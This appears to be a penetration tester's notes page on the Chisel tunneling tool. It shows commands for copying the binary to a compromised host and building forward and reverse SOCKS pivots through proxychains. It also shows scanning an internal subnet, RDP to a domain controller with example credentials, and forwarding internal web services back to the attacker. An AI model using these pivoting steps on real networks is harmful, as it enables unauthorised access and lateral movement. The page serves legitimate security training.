---
description: >-
  Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to
  transport data that is secured using SSH. Chisel can create a client-server
  connection in a firewall restricted environment.
---

# Chisel

<mark style="color:red;">**IMPORTANT:**</mark>** We need to be mindful of the size of files we transfer onto targets, not just for performance reasons but also considering detection. Some useful links to proceed:**

{% embed url="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" %}

## **Installing Chisel**

### Clone Repository

```shell-session
attacker@kali$ git clone https://github.com/jpillora/chisel.git
```

### B**uilding the Chisel Binary**

```shell-session
attacker@kali$ cd chisel
go build
```

## Transfer Chisel Binary to Victim

**Transferring Chisel Binary with SCP, A Web Server, or other methods of choice.**

```shell-session
attacker@kali$ scp chisel victim@10.129.202.64:~/home/victim
```

## **Running Chisel Server - Jump Host Server**

**We start a chisel server for a client to connect to.**

```shell-session
victim@ubuntu$ ./chisel server -v -p 1234 --socks5
```

<mark style="color:red;">**NOTE:**</mark> This can be on jump host, kali host, or whichever host we need it for.&#x20;

Chisel will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and _**forward it to all the networks that are accessible on the pivot host.**_

## Running Chisel Client

<mark style="color:red;">**NOTE:**</mark> we can also run the chisel server on the Kali host.

```shell-session
attacker@kali$ ./chisel client -v 10.129.202.64:1234 socks
2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

In the above output, the Chisel client creates a TCP/UDP tunnel via HTTP using SSH between the Chisel server and the client and starts a listener on local port 1080. _**Now we can modify proxychains.conf and add 1080 port so we can use it to pivot between 1080 and the tunnel.**_\


```shell-session
$ tail -f /etc/proxychains.conf 
...
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

**Pivoting / Attacking the DC**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ proxychains nmap 172.16.5.1-200 -sn -v
</strong></code></pre>

```shell-session
attacker@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Pivot - Kali Server

In the previous example, we transfered a chisel binary to the compromised victim machine and started a listener on port 1234. Commonly, there will be scenarios where firewalls restrict inbound connections to our target. In such cases, we can use Chisel with the reverse tunnel option.

With the Chisel --reverse (-R) enabled, The server (attack host) will listen and accept connections and then be proxied through the client.

### S**tarting the Chisel Server on our Attack Host**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ sudo ./chisel server --reverse -v -p 1234 --socks5
</strong></code></pre>

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`

### C**onnecting the Chisel Client to our Attack Host**

```shell-session
victim@ubuntu$ ./chisel client -v <kali-ip>:1234 R:socks
```

_<mark style="color:red;">**NOTE:**</mark>** **<mark style="color:yellow;">**Chisel opens a port**</mark>** **<mark style="color:red;">**1080**</mark>** **<mark style="color:yellow;">**that we will use.**</mark>_

_**Now we can modify proxychains.conf and add 1080 port so we can use it to pivot between 1080 and the tunnel.**_

```shell-session
$ tail -f /etc/proxychains.conf 
...
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

**Pivoting / Attacking the DC**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ proxychains nmap 172.16.5.1-200 -sn -v
</strong></code></pre>

```shell-session
attacker@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```



### Port Forwarding localhost Web Service (phpmyadmin)

If the server we popped a shell on is running phpmyadmin its work portforwarding back to our host.

```powershell
.\chisel.exe client 192.168.45.170:8081 R:8090:localhost:80
```

Navigating to localhost:8090, we can now access the admin portal

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

### **Port Forwarding an Internal Web Service.**

Sometimes we may want to port foward a direct port back to our reverse port forward. We can use the syntax: **R:localport:remotehost:remoteport.**

<mark style="color:red;">**NOTE:**</mark> <mark style="color:yellow;">**This is useful if we want to access an internal**</mark>** **<mark style="color:red;">**web service**</mark>** **<mark style="color:yellow;">**on our local machine through 127.0.0.1**</mark>

```powershell
C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80

2022/10/11 07:22:46 client: Connecting to ws://192.168.119.5:8080
2022/10/11 07:22:46 client: Connected (Latency 11.0449ms)
```

#### We can navigate to 127.0.0.1 and see the portforwarded web service

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We may need to upate our /etc/hosts to fit the domain name.

